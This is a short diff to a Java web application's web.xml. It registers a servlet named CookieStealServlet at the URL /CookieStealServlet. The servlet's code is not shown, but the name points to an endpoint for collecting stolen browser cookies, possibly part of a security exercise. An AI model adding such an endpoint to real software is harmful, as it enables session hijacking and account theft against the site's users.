@@ -172,7 +172,19 @@
 		<servlet-name>AfficherPropMeteoServlet</servlet-name>
 		<url-pattern>/AfficherPropMeteoServlet</url-pattern>
 	</servlet-mapping>
-
+	
+	
+	<servlet>
+		<description>
+			</description>
+		<display-name>CookieStealServlet</display-name>
+		<servlet-name>CookieStealServlet</servlet-name>
+		<servlet-class>com.lmo.controller.CookieStealServlet</servlet-class>
+	</servlet>
+	<servlet-mapping>
+		<servlet-name>CookieStealServlet</servlet-name>
+		<url-pattern>/CookieStealServlet</url-pattern>
+	</servlet-mapping>
 
 
 </web-app>
